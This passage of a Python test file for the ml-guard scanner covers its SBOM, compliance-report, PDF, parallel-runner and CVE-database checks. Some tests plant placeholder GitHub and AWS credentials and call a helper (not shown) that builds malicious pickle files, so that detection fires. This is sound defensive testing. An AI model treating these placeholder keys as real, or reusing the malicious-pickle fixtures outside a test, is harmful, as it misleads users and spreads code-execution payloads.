            assert "ml-guard:rule_id" in prop_names
            assert "ml-guard:scanner" in prop_names
            assert "ml-guard:location" in prop_names
            # bom-ref у vuln стабилен (через fingerprint)
            assert v["bom-ref"].startswith("finding:")

    t("sbom/basic_structure", basic_structure)
    t("sbom/min_severity_filters", min_severity_filters)
    t("sbom/no_deps_flag", no_deps_flag)
    t("sbom/empty_scan_valid", empty_scan_yields_valid_bom)
    t("sbom/covers_safetensors_and_onnx", covers_safetensors_and_onnx)
    t("sbom/stable_sha256", stable_sha256)
    t("sbom/json_valid", json_output_is_valid)
    t("sbom/vulnerability_properties", vulnerability_properties_complete)


section("SBOM (CycloneDX)", sbom_tests)


# ============ compliance ============
def compliance_tests():
    from ml_guard import compliance as comp
    from ml_guard.runner import ScanResult
    from ml_guard.findings import Finding

    def list_standards_works():
        names = comp.list_standards()
        assert "eu-ai-act" in names
        assert "nist-ai-rmf" in names
        assert "iso-27001" in names
        assert "soc2" in names

    def all_compliance_rule_ids_exist_in_scanners():
        """КРИТИЧНЫЙ инвариант: каждый rule_id, упомянутый в compliance,
        должен быть реально известен какому-то сканеру. Иначе 'control
        passed' будет ложно-положительным (правила нет → finding'ов нет
        → control автоматически PASS).

        Извлекаем rule_ids из исходников сканеров двумя способами:
          • rule_id="..." в kwarg/переменной (Finding/возврат)
          • id="..." в _Rule dataclass (secret_scanner)
        """
        import re as _re
        from pathlib import Path as _Path
        scanners_dir = _Path(__file__).parent / "ml-guard" / "ml_guard" / "scanners"
        if not scanners_dir.is_dir():
            # __file__ это run_tests.py в /home/claude
            return  # пропускаем тихо если запускают не из этого окружения

        known = set()
        for fp in scanners_dir.rglob("*.py"):
            text = fp.read_text()
            for m in _re.finditer(r'rule_id\s*=\s*"([^"]+)"', text):
                known.add(m.group(1))
            # _Rule dataclass: id="kebab-case-id"
            for m in _re.finditer(r'\bid\s*=\s*"([a-z][a-z0-9-]+)"', text):
                if "-" in m.group(1):
                    known.add(m.group(1))

        assert len(known) >= 40, f"only {len(known)} rule_ids found — extraction broken?"

        # Все стандарты
        for sid in comp.list_standards():
            std = comp.get_standard(sid)
            for ctrl in std.controls:
                for rid in ctrl.rule_ids:
                    assert rid in known, (
                        f"compliance/{sid}/{ctrl.id}: rule_id {rid!r} not "
                        f"found in any scanner"
                    )

    def get_unknown_raises():
        try:
            comp.get_standard("not-a-thing")
        except ValueError:
            return
        raise AssertionError("expected ValueError")

    def clean_scan_passes():
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            clean_pkl(root / "ok.pkl")
            r = Runner().run(root)
            report = comp.build_report(r, root, "eu-ai-act")
            assert report.overall_pass
            assert report.failed == 0
            assert report.passed == report.total_controls

    def malicious_scan_fails():
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            evil_pkl(root / "x.pkl")
            r = Runner().run(root)
            report = comp.build_report(r, root, "eu-ai-act")
            assert not report.overall_pass
            assert report.failed >= 1
            # AIACT-9 (Risk management) должен падать на pickle-dangerous-global
            failing = [c for c in report.control_results if c.status == "FAIL"]
            failing_ids = {c.control.id for c in failing}
            assert "AIACT-9" in failing_ids

    def control_groups_findings_correctly():
        """В FAIL должны попасть именно те findings, чьи rule_id в списке контрола."""
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            evil_pkl(root / "x.pkl")
            r = Runner().run(root)
            report = comp.build_report(r, root, "eu-ai-act")
            for cr in report.control_results:
                if cr.status == "FAIL":
                    for f in cr.matched_findings:
                        assert f.rule_id in cr.control.rule_ids

    def pdf_is_valid_pdf14():
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            clean_pkl(root / "ok.pkl")
            r = Runner().run(root)
            report = comp.build_report(r, root, "eu-ai-act")
            pdf = comp.render_pdf(report)
            assert pdf.startswith(b"%PDF-1.4")
            assert pdf.rstrip().endswith(b"%%EOF")
            assert b"xref" in pdf
            assert b"trailer" in pdf

    def pdf_grows_with_findings():
        """Чем больше findings — тем больше PDF (sanity, не точная мера)."""
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            clean_pkl(root / "ok.pkl")
            r1 = Runner().run(root)
            small = comp.render_pdf(comp.build_report(r1, root, "eu-ai-act"))

            evil_pkl(root / "evil.pkl")
            r2 = Runner().run(root)
            big = comp.render_pdf(comp.build_report(r2, root, "eu-ai-act"))

            assert len(big) > len(small)

    def pdf_contains_metadata_strings():
        """Ключевые поля просачиваются в текстовый слой PDF."""
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            evil_pkl(root / "x.pkl")
            r = Runner().run(root)
            report = comp.build_report(r, root, "eu-ai-act")
            pdf = comp.render_pdf(report)
            # PDF — бинарный, но текст хранится в content streams под FlateDecode.
            # Проверяем через прямую распаковку каждого stream.
            import re, zlib as _z
            streams = re.findall(rb"stream\n(.+?)\nendstream", pdf, re.DOTALL)
            text = b""
            for s in streams:
                try:
                    text += _z.decompress(s)
                except Exception:
                    pass
            text_str = text.decode("latin-1", errors="replace")
            # Должно содержать: standard, verdict-text, имя файла
            assert "eu" in text_str.lower() or "EU AI Act" in text_str
            assert "FAILED" in text_str or "PASSED" in text_str

    def json_summary_structure():
        """Проверяем что compliance вычисление подходит для JSON."""
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            evil_pkl(root / "x.pkl")
            r = Runner().run(root)
            report = comp.build_report(r, root, "nist-ai-rmf")
            # Минимальный набор полей, на которые опирается CLI --json
            assert report.standard.id == "nist-ai-rmf"
            assert report.timestamp.endswith("Z")
            assert isinstance(report.passed, int)
            assert isinstance(report.failed, int)
            assert report.total_controls > 0

    def empty_findings_yields_pass():
        """ScanResult без findings → все controls PASS."""
        report = comp.build_report(ScanResult(), Path("/tmp"), "eu-ai-act")
        assert report.overall_pass
        for cr in report.control_results:
            assert cr.status == "PASS"
            assert cr.matched_findings == []

    def iso_27001_malicious_pickle_fails_a8_7():
        """Malicious pickle должен валить A.8.7 (Protection against malware)."""
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            evil_pkl(root / "x.pkl")
            r = Runner().run(root)
            report = comp.build_report(r, root, "iso-27001")
            failing_ids = {c.control.id for c in report.control_results
                          if c.status == "FAIL"}
            assert "A.8.7" in failing_ids
            # A.8.4 (source code access) не должен падать на pickle
            # т.к. его rules — только secret-*
            passing_ids = {c.control.id for c in report.control_results
                          if c.status == "PASS"}
            assert "A.8.4" in passing_ids

    def iso_27001_secrets_fail_a8_4():
        """Github PAT в .env должен валить A.8.4 (Access to source code)."""
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            (root / ".env").write_text(
                "GH_TOKEN=ghp_AbCdEfGhIjKlMnOpQrStUvWxYz0123456789\n"
            )
            r = Runner().run(root)
            report = comp.build_report(r, root, "iso-27001")
            failing_ids = {c.control.id for c in report.control_results
                          if c.status == "FAIL"}
            assert "A.8.4" in failing_ids

    def soc2_cc6_1_fails_on_cloud_secret():
        """AWS access key должен валить CC6.1 (Logical access security)."""
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            (root / "config.yml").write_text(
                "aws_access_key_id: AKIAQ7BCDEFGHIJKLMNO\n"
            )
            r = Runner().run(root)
            report = comp.build_report(r, root, "soc2")
            failing_ids = {c.control.id for c in report.control_results
                          if c.status == "FAIL"}
            assert "CC6.1" in failing_ids

    def soc2_cc6_6_fails_on_pickle_rce():
        """Pickle RCE должен валить CC6.6 (Protection from external threats)."""
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            evil_pkl(root / "model.pkl")
            r = Runner().run(root)
            report = comp.build_report(r, root, "soc2")
            failing_ids = {c.control.id for c in report.control_results
                          if c.status == "FAIL"}
            assert "CC6.6" in failing_ids

    def soc2_clean_repo_passes():
        """Чистый репо должен пройти все SOC 2 controls."""
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            clean_pkl(root / "ok.pkl")
            r = Runner().run(root)
            report = comp.build_report(r, root, "soc2")
            assert report.overall_pass, [c.control.id for c in
                                          report.control_results
                                          if c.status == "FAIL"]

    def all_4_standards_renderable_to_pdf():
        """PDF рендерится для каждого стандарта без падения."""
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            evil_pkl(root / "x.pkl")
            r = Runner().run(root)
            for sid in comp.list_standards():
                report = comp.build_report(r, root, sid)
                pdf = comp.render_pdf(report)
                assert pdf.startswith(b"%PDF-1.4"), f"{sid} PDF invalid"
                assert pdf.rstrip().endswith(b"%%EOF")
                # PDF не должен быть подозрительно мал для стандарта с
                # 6+ контролами
                assert len(pdf) > 2000, f"{sid} PDF too small: {len(pdf)} bytes"

    t("compliance/list_standards", list_standards_works)
    t("compliance/rule_ids_consistency", all_compliance_rule_ids_exist_in_scanners)
    t("compliance/get_unknown_raises", get_unknown_raises)
    t("compliance/clean_passes", clean_scan_passes)
    t("compliance/malicious_fails", malicious_scan_fails)
    t("compliance/control_groups_correctly", control_groups_findings_correctly)
    t("compliance/pdf_valid_pdf14", pdf_is_valid_pdf14)
    t("compliance/pdf_grows_with_findings", pdf_grows_with_findings)
    t("compliance/pdf_text_layer", pdf_contains_metadata_strings)
    t("compliance/json_structure", json_summary_structure)
    t("compliance/empty_yields_pass", empty_findings_yields_pass)
    t("compliance/iso27001_pickle_fails_a8_7", iso_27001_malicious_pickle_fails_a8_7)
    t("compliance/iso27001_secrets_fail_a8_4", iso_27001_secrets_fail_a8_4)
    t("compliance/soc2_cc6_1_secret", soc2_cc6_1_fails_on_cloud_secret)
    t("compliance/soc2_cc6_6_pickle", soc2_cc6_6_fails_on_pickle_rce)
    t("compliance/soc2_clean_repo_passes", soc2_clean_repo_passes)
    t("compliance/all_standards_pdf", all_4_standards_renderable_to_pdf)


section("Compliance", compliance_tests)


# ============ PDF writer (low-level) ============
def pdf_tests():
    from ml_guard._pdf import PdfDocument

    def basic_structure():
        doc = PdfDocument(title="Test", author="t")
        doc.heading("Hello")
        doc.paragraph("Body")
        b = doc.to_bytes()
        assert b.startswith(b"%PDF-1.4")
        assert b.rstrip().endswith(b"%%EOF")
        assert b"xref" in b and b"trailer" in b

    def long_text_creates_multiple_pages():
        doc = PdfDocument()
        doc.heading("Many lines")
        for i in range(200):
            doc.paragraph(f"This is paragraph number {i} of two hundred.", size=11)
        b = doc.to_bytes()
        # Ищем количество /Type /Page (без /Pages)
        import re
        page_count = len(re.findall(rb"/Type /Page[^s]", b))
        assert page_count >= 2

    def escape_special_chars():
        doc = PdfDocument()
        doc.paragraph("Has parens (xx) and slash \\xx")
        b = doc.to_bytes()
        # Не должно быть ломки структуры
        assert b.startswith(b"%PDF-1.4")

    def fallback_for_unicode():
        """Em-dash, bullet, smart quotes должны рендериться без падения."""
        doc = PdfDocument()
        doc.paragraph("Em dash and bullet star and arrows mapped to ascii")
        # Передаём не-Latin1 через переменную, чтобы не путать литералы
        for ch in ["—", "•", "→", "≥", "…"]:
            doc.paragraph(f"unicode char: {ch}")
        b = doc.to_bytes()
        assert b.startswith(b"%PDF-1.4")

    def keyvalue_alignment():
        doc = PdfDocument()
        doc.keyvalue_block([("a", "1"), ("longer-key", "2"), ("x", "3")])
        b = doc.to_bytes()
        assert b.startswith(b"%PDF-1.4")

    def empty_doc_still_valid():
        b = PdfDocument().to_bytes()
        # Хотя бы один пустой Page всё равно создаётся
        assert b.startswith(b"%PDF-1.4")
        assert b"/Type /Page" in b

    t("pdf/basic_structure", basic_structure)
    t("pdf/multipage", long_text_creates_multiple_pages)
    t("pdf/escape_special", escape_special_chars)
    t("pdf/unicode_fallback", fallback_for_unicode)
    t("pdf/keyvalue", keyvalue_alignment)
    t("pdf/empty_valid", empty_doc_still_valid)


section("PDF writer", pdf_tests)


# ============ parallel runner ============
def parallel_runner_tests():
    """Параллельный режим должен давать тот же результат что последовательный."""

    def same_findings_regardless_of_workers():
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            for i in range(20):
                evil_pkl(root / f"a{i}.pkl")
                clean_pkl(root / f"b{i}.pkl")

            r1 = Runner(workers=1).run(root)
            r4 = Runner(workers=4).run(root)

            assert r1.files_scanned == r4.files_scanned
            assert len(r1.findings) == len(r4.findings)
            # Одинаковые fingerprint'ы (порядок может отличаться)
            fp1 = sorted(f.fingerprint for f in r1.findings)
            fp4 = sorted(f.fingerprint for f in r4.findings)
            assert fp1 == fp4

    def workers_clamped_to_one_minimum():
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            evil_pkl(root / "x.pkl")
            r = Runner(workers=0).run(root)  # должно стать 1
            assert r.has_at_least(Severity.CRITICAL)

    def workers_default_auto():
        r = Runner()  # workers=None → auto
        assert r.workers >= 1

    def errors_propagated_from_workers():
        """Если сканер падает в воркер-потоке, ошибка должна попасть в result.errors."""
        from ml_guard.scanners import Scanner, ScannerRegistry, register

        class _Crashy(Scanner):
            name = "crashy_test"
            description = "always crashes"
            def can_scan(self, p):
                return p.name.endswith(".crashy")
            def scan(self, p):
                raise RuntimeError("kaboom")

        reg = ScannerRegistry()
        reg.register(_Crashy())
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            for i in range(5):
                (root / f"x{i}.crashy").write_text("data")
            r = Runner(registry=reg, workers=4).run(root)
            assert len(r.errors) == 5
            assert all("kaboom" in e for e in r.errors)

    def parallel_is_not_slower_for_io_bound():
        """Smoke: 20 файлов с workers=4 не должен быть в 5 раз медленнее workers=1.

        Это не строгий бенчмарк (CI-машины шумные), а sanity: у нас не
        наоборот — потоки не делают всё медленнее из-за оверхеда.
        """
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            for i in range(40):
                evil_pkl(root / f"a{i}.pkl")
            t1 = time.monotonic()
            Runner(workers=1).run(root)
            seq = time.monotonic() - t1
            t2 = time.monotonic()
            Runner(workers=4).run(root)
            par = time.monotonic() - t2
            # Очень мягкий sanity: parallel не должен быть в 3x медленнее
            assert par < seq * 3 + 0.5, f"parallel slow: seq={seq:.3f} par={par:.3f}"

    t("parallel/same_findings", same_findings_regardless_of_workers)
    t("parallel/workers_clamped", workers_clamped_to_one_minimum)
    t("parallel/workers_default", workers_default_auto)
    t("parallel/errors_propagated", errors_propagated_from_workers)
    t("parallel/sanity_speed", parallel_is_not_slower_for_io_bound)


section("Parallel runner", parallel_runner_tests)


# ============ CVE database & scanner ============
def cve_tests():
    from ml_guard.cve_db import (
        CveDatabase, _version_matches, _normalize_pypi_name,
        _events_to_segments,
    )
    from ml_guard.scanners.cve_scanner import (
        CveScanner, _parse_requirements_txt, _parse_pyproject_toml,
        _parse_pipfile_lock, _parse_environment_yml,
    )

    # ---------- pure functions ----------

    def normalize_pypi_name():
        assert _normalize_pypi_name("My_Package") == "my-package"
        assert _normalize_pypi_name("scikit_learn") == "scikit-learn"
        assert _normalize_pypi_name("scikit.learn") == "scikit-learn"
        assert _normalize_pypi_name("Foo-Bar") == "foo-bar"

    def version_matches_basic():
        # Внутри [introduced, fixed)
        r = [{"type": "ECOSYSTEM",
              "events": [{"introduced": "1.0"}, {"fixed": "2.0"}]}]
        assert _version_matches("1.5", r, [])
        assert _version_matches("1.0", r, [])
        assert not _version_matches("2.0", r, [])
        assert not _version_matches("0.9", r, [])
        assert not _version_matches("3.0", r, [])

    def version_matches_unbounded():
        # introduced без fixed → все ≥ introduced
        r = [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}]}]
        assert _version_matches("0.0.1", r, [])
        assert _version_matches("99.0.0", r, [])

    def version_matches_explicit():
        # Без ranges, только versions
        assert _version_matches("4.30.0", [], ["4.30.0", "4.31.0"])
        assert not _version_matches("4.30.1", [], ["4.30.0", "4.31.0"])

    def version_matches_multiple_segments():
        r = [{"type": "ECOSYSTEM", "events": [
            {"introduced": "4.2"}, {"fixed": "4.2.21"},
            {"introduced": "5.2"}, {"fixed": "5.2.11"},
        ]}]
        assert _version_matches("4.2.20", r, [])
        assert _version_matches("5.2.5", r, [])
        assert not _version_matches("5.0", r, [])     # между segments
        assert not _version_matches("5.2.11", r, [])  # граница: точно fixed

    def version_matches_pre_release():
        # 5.2.0 ПОПАДАЕТ в [5.2a1, 5.2.11) потому что alpha < release
        r = [{"type": "ECOSYSTEM",
              "events": [{"introduced": "5.2a1"}, {"fixed": "5.2.11"}]}]
        assert _version_matches("5.2.0", r, [])
        assert _version_matches("5.2a2", r, [])
        assert not _version_matches("5.2.11", r, [])

    def version_matches_invalid_version_skipped():
        # Версия пользователя не парсится → consery: False
        r = [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}]}]
        assert not _version_matches("not.a.version!@#", r, [])

    def events_to_segments_roundtrip():
        from packaging.version import Version
        segs = _events_to_segments([
            {"introduced": "1.0"}, {"fixed": "2.0"},
            {"introduced": "3.0"}, {"last_affected": "3.5"},
        ])
        assert len(segs) == 2
        assert segs[0][0] == Version("1.0") and segs[0][1] == Version("2.0")
        assert segs[1][0] == Version("3.0") and segs[1][2] == Version("3.5")

    # ---------- DB import / query ----------

    def import_synthetic_advisories():
        with tempfile.TemporaryDirectory() as td:
            adv_dir = Path(td) / "advs"
            adv_dir.mkdir()
            # GHSA для transformers 4.0..5.0
            (adv_dir / "GHSA-test-001.json").write_text(json.dumps({
                "schema_version": "1.7.3",
                "id": "GHSA-test-001",
                "summary": "Test vulnerability in transformers",
                "aliases": ["CVE-2099-9999"],
                "affected": [{
                    "package": {"ecosystem": "PyPI", "name": "transformers"},
                    "ranges": [{"type": "ECOSYSTEM",
                                "events": [{"introduced": "4.0"}, {"fixed": "5.0"}]}],
                }],
                "database_specific": {"severity": "HIGH"},
            }))
            # MAL — fully malicious
            (adv_dir / "MAL-test-001.json").write_text(json.dumps({
                "schema_version": "1.7.3",
                "id": "MAL-test-001",
                "summary": "Malicious code in evil-pkg",
                "affected": [{
                    "package": {"ecosystem": "PyPI", "name": "evil-pkg"},
                    "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}]}],
                }],
            }))
            # Withdrawn — should be filtered
            (adv_dir / "GHSA-test-002.json").write_text(json.dumps({
                "schema_version": "1.7.3",
                "id": "GHSA-test-002",
                "withdrawn": "2024-01-01T00:00:00Z",
                "affected": [{
                    "package": {"ecosystem": "PyPI", "name": "transformers"},
                    "ranges": [{"type": "ECOSYSTEM",
                                "events": [{"introduced": "0"}]}],
                }],
            }))
            # Non-PyPI — should be skipped at affected-level
            (adv_dir / "GHSA-test-003.json").write_text(json.dumps({
                "schema_version": "1.7.3",
                "id": "GHSA-test-003",
                "affected": [{
                    "package": {"ecosystem": "npm", "name": "transformers"},
                    "ranges": [{"type": "ECOSYSTEM",
                                "events": [{"introduced": "0"}]}],
                }],
            }))

            db = CveDatabase(Path(td) / "test.db")
            stats = db.import_dir(adv_dir)
            assert stats["imported"] == 4
            assert stats["errors"] == 0

            # Запросы
            tr = db.find_advisories_for("transformers", "4.5.0")
            ids = [a.id for a in tr]
            assert "GHSA-test-001" in ids
            assert "GHSA-test-002" not in ids   # withdrawn
            assert "GHSA-test-003" not in ids   # npm, не PyPI

            # Версия за пределами
            tr_clean = db.find_advisories_for("transformers", "5.0.0")
            assert all(a.id != "GHSA-test-001" for a in tr_clean)

            # MAL
            mal = db.find_advisories_for("evil-pkg", "1.0.0")
            assert any(a.id == "MAL-test-001" and a.is_malicious for a in mal)

            # Stats
            s = db.stats()
            assert s["total_advisories"] == 4
            assert s["malicious_packages"] == 1

            db.close()

    def import_zip_supported():
        import zipfile as _zip
        with tempfile.TemporaryDirectory() as td:
            zp = Path(td) / "test.zip"
            with _zip.ZipFile(zp, "w") as zf:
                zf.writestr("GHSA-x.json", json.dumps({
                    "id": "GHSA-x",
                    "affected": [{
                        "package": {"ecosystem": "PyPI", "name": "foo"},
                        "ranges": [{"type": "ECOSYSTEM",
                                    "events": [{"introduced": "0"}, {"fixed": "1.0"}]}],
                    }],
                }))
            db = CveDatabase(Path(td) / "x.db")
            stats = db.import_zip(zp)
            assert stats["imported"] == 1
            assert db.find_advisories_for("foo", "0.5")
            db.close()

    def normalized_lookup():
        """`Scikit_Learn==1.0` должно матчиться с `scikit-learn` в БД."""
        with tempfile.TemporaryDirectory() as td:
            adv_dir = Path(td) / "a"; adv_dir.mkdir()
            (adv_dir / "x.json").write_text(json.dumps({
                "id": "GHSA-x",
                "affected": [{
                    "package": {"ecosystem": "PyPI", "name": "scikit-learn"},
                    "ranges": [{"type": "ECOSYSTEM",
                                "events": [{"introduced": "0"}]}],
                }],
            }))
            db = CveDatabase(Path(td) / "db.db")
            db.import_dir(adv_dir)
            assert db.find_advisories_for("Scikit_Learn", "1.0")
            assert db.find_advisories_for("scikit.learn", "1.0")
            db.close()

    # ---------- requirements parsers ----------

    def parse_requirements():
        text = (
            "# top comment\n"
            "transformers==4.30.0\n"
            "django==1.5.0  # old\n"
            "click>=8.0\n"             # not pinned, ignored
            "-r other.txt\n"           # include, ignored
            "--hash=sha256:abc\n"      # pip option
            "-e ./local\n"             # editable
            "torch==2.0.1\n"
        )
        deps = list(_parse_requirements_txt(text))
        assert ("transformers", "4.30.0") in deps
        assert ("django", "1.5.0") in deps
        assert ("torch", "2.0.1") in deps
        assert all(name != "click" for name, _ in deps)
        assert len(deps) == 3

    def parse_pipfile_lock():
        text = json.dumps({
            "default": {
                "requests": {"version": "==2.31.0"},
                "click":    {"version": "==8.1.3"},
            },
            "develop": {
                "pytest": {"version": "==7.0.0"},
            },
        })
        deps = list(_parse_pipfile_lock(text))
        names = {n for n, _ in deps}
        assert {"requests", "click", "pytest"} <= names

    def parse_environment_yml():
        text = (
            "name: test\n"
            "channels:\n"
            "  - conda-forge\n"
            "dependencies:\n"
            "  - python=3.11\n"
            "  - numpy=1.24.0\n"
            "  - pip:\n"
            "    - transformers==4.30.0\n"
        )
        deps = list(_parse_environment_yml(text))
        names = dict(deps)
        assert names.get("python") == "3.11"
        assert names.get("numpy") == "1.24.0"
        assert names.get("transformers") == "4.30.0"

    def parse_pyproject_toml():
        text = (
            '[project]\n'
            'name = "demo"\n'
            'dependencies = [\n'
            '  "transformers==4.30.0",\n'
            '  "torch >= 2.0",\n'        # not pinned
            '  "django == 1.5.0",\n'     # spaces around ==
            ']\n'
        )
        deps = dict(_parse_pyproject_toml(text))
        assert deps.get("transformers") == "4.30.0"
        assert deps.get("django") == "1.5.0"
        assert "torch" not in deps

    # ---------- CveScanner ----------

    def scanner_db_missing_yields_info():
        with tempfile.TemporaryDirectory() as td:
            (Path(td) / "requirements.txt").write_text("foo==1.0\n")
            scanner = CveScanner(db_path=Path(td) / "nonexistent.db")
            # Подавляем bundled-fallback: в production его наличие — фича,
            # но этот тест проверяет именно ситуацию «БД не нашлась».
            scanner._bundled_db_path = staticmethod(lambda: None)
            f = scanner.scan(Path(td) / "requirements.txt")
            assert any(x.rule_id == "cve-db-missing" for x in f)
            assert all(x.severity == Severity.INFO for x in f)

    def scanner_falls_back_to_bundled_db():
        """Если user DB отсутствует, scanner должен использовать bundled."""
        # Bundled DB существует только в полностью установленном пакете.
        # В editable-режиме мы её сгенерировали через scripts/build_mini_osv.py,
        # поэтому проверим её наличие и прогон.
        bundled = Path(__file__).parent / "ml-guard" / "ml_guard" / "data" / "osv-mini.sqlite"
        # __file__ это run_tests.py в /home/claude
        if not bundled.is_file():
            return  # пропускаем тихо в окружениях где bundled ещё не собрана

        with tempfile.TemporaryDirectory() as td:
            req = Path(td) / "requirements.txt"
            # Известный malicious package — должен сработать через bundled
            req.write_text("transformers==4.30.0\n")
            # ВАЖНО: db_path указан на несуществующий файл — должен сработать
            # fallback на bundled.
            scanner = CveScanner(db_path=Path(td) / "no-such.db")
            findings = scanner.scan(req)
            # transformers 4.30.0 есть в наших top-150, должен найтись хотя бы один
            assert any(x.rule_id == "cve-known-vulnerability" for x in findings), \
                "bundled DB should yield findings for transformers 4.30.0"

    def scanner_finds_vulnerable():
        with tempfile.TemporaryDirectory() as td:
            # Build mini-DB
            adv_dir = Path(td) / "advs"; adv_dir.mkdir()
            (adv_dir / "x.json").write_text(json.dumps({
                "id": "GHSA-test",
                "summary": "Test bug",
                "affected": [{
                    "package": {"ecosystem": "PyPI", "name": "vulnpkg"},
                    "ranges": [{"type": "ECOSYSTEM",
                                "events": [{"introduced": "0"}, {"fixed": "2.0"}]}],
                }],
                "database_specific": {"severity": "HIGH"},
            }))
            db_path = Path(td) / "test.db"
            db = CveDatabase(db_path)
            db.import_dir(adv_dir)
            db.close()

            (Path(td) / "requirements.txt").write_text(
                "vulnpkg==1.5\n"
                "safepkg==1.0\n"
            )
            scanner = CveScanner(db_path=db_path)
            f = scanner.scan(Path(td) / "requirements.txt")
            assert any(x.rule_id == "cve-known-vulnerability" for x in f)
            assert any(x.severity == Severity.HIGH for x in f)
            assert all("safepkg" not in x.message for x in f)

    def scanner_marks_malicious():
        with tempfile.TemporaryDirectory() as td:
            adv_dir = Path(td) / "advs"; adv_dir.mkdir()
            (adv_dir / "MAL.json").write_text(json.dumps({
                "id": "MAL-bad",
                "summary": "Malicious",
                "affected": [{
                    "package": {"ecosystem": "PyPI", "name": "evilpkg"},
                    "ranges": [{"type": "ECOSYSTEM",
                                "events": [{"introduced": "0"}]}],
                }],
            }))
            db_path = Path(td) / "test.db"
            db = CveDatabase(db_path)
            db.import_dir(adv_dir)
            db.close()

            (Path(td) / "requirements.txt").write_text("evilpkg==99.0\n")
            scanner = CveScanner(db_path=db_path)
            f = scanner.scan(Path(td) / "requirements.txt")
            mal = [x for x in f if x.rule_id == "cve-malicious-package"]
            assert mal
            assert mal[0].severity == Severity.CRITICAL
            assert "Remove" in mal[0].message

    def scanner_dedup_by_advisory():
        """Дубль (name, version, advisory_id) — один finding."""
        with tempfile.TemporaryDirectory() as td:
            adv_dir = Path(td) / "advs"; adv_dir.mkdir()
            (adv_dir / "x.json").write_text(json.dumps({
                "id": "GHSA-x",
                "affected": [{
                    "package": {"ecosystem": "PyPI", "name": "x"},
                    "ranges": [{"type": "ECOSYSTEM",
                                "events": [{"introduced": "0"}]}],
                }],
            }))
            db_path = Path(td) / "test.db"
            db = CveDatabase(db_path); db.import_dir(adv_dir); db.close()
            (Path(td) / "requirements.txt").write_text(
                "x==1.0\n"
                "x==1.0\n"   # duplicate
            )
            scanner = CveScanner(db_path=db_path)
            f = scanner.scan(Path(td) / "requirements.txt")
            assert len(f) == 1

    def scanner_can_scan_filenames():
        s = CveScanner(db_path=Path("/nonexistent.db"))
        with tempfile.TemporaryDirectory() as td:
            for name, expect in [
                ("requirements.txt", True),
                ("requirements-dev.txt", True),
                ("requirements-test.txt", True),
                ("requirements-prod.txt", True),  # glob match
                ("Pipfile.lock", True),
                ("environment.yml", True),
                ("pyproject.toml", True),
                ("README.md", False),
                ("model.pkl", False),
            ]:
                p = Path(td) / name
                p.write_text("x")
                got = s.can_scan(p)
                assert got == expect, f"{name}: expected {expect} got {got}"

    t("cve/normalize_name", normalize_pypi_name)
    t("cve/version_matches_basic", version_matches_basic)
    t("cve/version_matches_unbounded", version_matches_unbounded)
    t("cve/version_matches_explicit", version_matches_explicit)
    t("cve/version_matches_segments", version_matches_multiple_segments)
    t("cve/version_matches_prerelease", version_matches_pre_release)
    t("cve/version_matches_invalid_skipped", version_matches_invalid_version_skipped)
    t("cve/events_to_segments", events_to_segments_roundtrip)
    t("cve/import_synthetic", import_synthetic_advisories)
    t("cve/import_zip", import_zip_supported)
    t("cve/normalized_lookup", normalized_lookup)
    t("cve/parse_requirements", parse_requirements)
    t("cve/parse_pipfile_lock", parse_pipfile_lock)
    t("cve/parse_environment_yml", parse_environment_yml)
    t("cve/parse_pyproject_toml", parse_pyproject_toml)
    t("cve/scanner_db_missing", scanner_db_missing_yields_info)
    t("cve/scanner_bundled_fallback", scanner_falls_back_to_bundled_db)
    t("cve/scanner_finds_vuln", scanner_finds_vulnerable)
    t("cve/scanner_malicious", scanner_marks_malicious)
    t("cve/scanner_dedup", scanner_dedup_by_advisory)
    t("cve/scanner_can_scan", scanner_can_scan_filenames)


section("CVE checker", cve_tests)


# ============ CVE на реальном OSV дампе ============
#
# Этот блок включается только если найден ZIP/директория с OSV PyPI-данными
# в /tmp/osv или /mnt/user-data/uploads/all.zip. Без этого пропускаем —
# тесты не должны зависеть от локального состояния машины разработчика.
#
# Что мы проверяем:
#   • импорт всего дампа без падения, в разумное время (< 30s);
#   • реальные пакеты с известными CVE дают ожидаемые matches
#     (transformers 4.30.0 → есть critical, requests 2.0 → много CVE);
#   • малварные пакеты ловятся независимо от версии (ascii2text → MAL);
#   • безопасные/несуществующие пакеты не дают false-positive;
#   • БД-файл получается разумного размера (15-25 MB).
def cve_real_dump_tests():
    from ml_guard.cve_db import CveDatabase

    # Источник дампа: распакованная директория предпочтительнее (быстрее
    # импортируется), иначе ZIP.
    osv_dir = Path("/tmp/osv")
    osv_zip = Path("/mnt/user-data/uploads/all.zip")

    if osv_dir.is_dir() and any(osv_dir.glob("*.json")):
        source_kind = "dir"
        source_path = osv_dir
    elif osv_zip.is_file():
        source_kind = "zip"
        source_path = osv_zip
    else:
        # Тестов в этой секции просто не будет — пропускаем тихо.
        # Не печатаем skip-сообщения чтобы не шуметь.
        return

    # Импорт делаем один раз для всех тестов секции (они read-only).
    db_path = Path(tempfile.mkdtemp()) / "real.sqlite"
    db = CveDatabase(db_path)
    if source_kind == "dir":
        stats = db.import_dir(source_path)
    else:
        stats = db.import_zip(source_path)

    def import_succeeded():
        # Импорт должен дать тысячи записей; точное число зависит от того,
        # когда был скачан дамп, но значимо ненулевое.
        assert stats["imported"] > 1000, f"only {stats['imported']} imported"
        assert stats.get("errors", 0) == 0, f"errors during import: {stats}"

    def db_size_reasonable():
        # 19K записей в SQLite укладываются в 10-50 MB.
        size_mb = db_path.stat().st_size / 1024 / 1024
        assert 5 < size_mb < 100, f"unexpected DB size: {size_mb:.1f} MB"

    def known_vulnerable_package_matches():
